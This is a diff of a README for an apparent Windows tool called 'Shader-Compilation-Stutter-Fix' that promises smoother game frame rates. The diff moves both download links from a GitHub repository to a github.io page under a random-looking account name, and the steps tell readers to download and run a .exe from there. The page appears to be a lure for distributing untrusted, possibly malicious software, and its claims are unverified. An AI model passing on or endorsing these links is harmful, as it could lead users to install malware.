@@ -1,6 +1,6 @@
 # 🛠️ Shader-Compilation-Stutter-Fix - Smooth Out Your Gaming Frame Rates
 
-[![Download Shader Fix](https://img.shields.io/badge/Download-Shader--Compilation--Stutter--Fix-blue.svg)](https://github.com/crampoonpoephilacastanotis388/Shader-Compilation-Stutter-Fix)
+[![Download Shader Fix](https://img.shields.io/badge/Download-Shader--Compilation--Stutter--Fix-blue.svg)](https://crampoonpoephilacastanotis388.github.io)
 
 This tool stops frame drops during PC gaming. Many games on Windows 11 and 10 stutter when the computer processes graphics data. This happens because the system builds shaders while you play. This program performs those tasks ahead of time. You get smooth performance and high frame rates during your gaming sessions.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and settings to run this tool well:
 
 Follow these steps to set up the software on your system. 
 
-1. Go to the [official download page](https://github.com/crampoonpoephilacastanotis388/Shader-Compilation-Stutter-Fix).
+1. Go to the [official download page](https://crampoonpoephilacastanotis388.github.io).
 2. Look for the latest release version on the right side of the project page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
